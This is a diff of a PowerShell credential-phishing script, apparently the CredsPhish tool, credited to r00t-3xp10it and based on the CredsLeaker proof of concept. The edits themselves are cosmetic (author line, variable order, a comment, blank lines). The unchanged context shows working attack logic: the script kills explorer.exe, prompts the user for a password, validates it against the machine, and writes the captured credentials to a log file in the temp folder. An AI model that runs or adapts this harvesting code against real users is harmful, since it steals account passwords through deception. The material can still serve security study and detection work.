@@ -3,7 +3,7 @@
 .SYNOPSIS
   Standalone Powershell script that will promp the current user for a valid credential.
 
-.Author: Based on @Dviros CredsLeaker (POC)
+.Author: r00t-3xp10it - (Based on @Dviros CredsLeaker poc)
   Required Dependencies: target Account Password
   Optional Dependencies: None
 
@@ -24,8 +24,8 @@
 
 
 taskkill /f /im explorer.exe
-$CurrentDomain_Name = $env:USERDOMAIN
 $ComputerName = $env:COMPUTERNAME
+$CurrentDomain_Name = $env:USERDOMAIN
 
 
 ## Prerequisites
@@ -77,7 +77,7 @@ function Credentials(){
                 $domain = "WORKGROUP"
                 $workgroup_creds = New-Object System.DirectoryServices.AccountManagement.PrincipalContext('machine',$ComputerName)
                 if ($workgroup_creds.ValidateCredentials($UserName, $Password) -eq $true){
-                    # Leak Creds to remote logfile
+                    # Leak Creds to remote logfile ($env:tmp)
                     $timestamp = Get-Date;
                     echo "" > $env:tmp\CredsPhish.log
                     echo "   Captured Credentials (logon)" >> $env:tmp\CredsPhish.log
@@ -107,6 +107,4 @@ function Credentials(){
         }
     }
 }
-
-
 Credentials
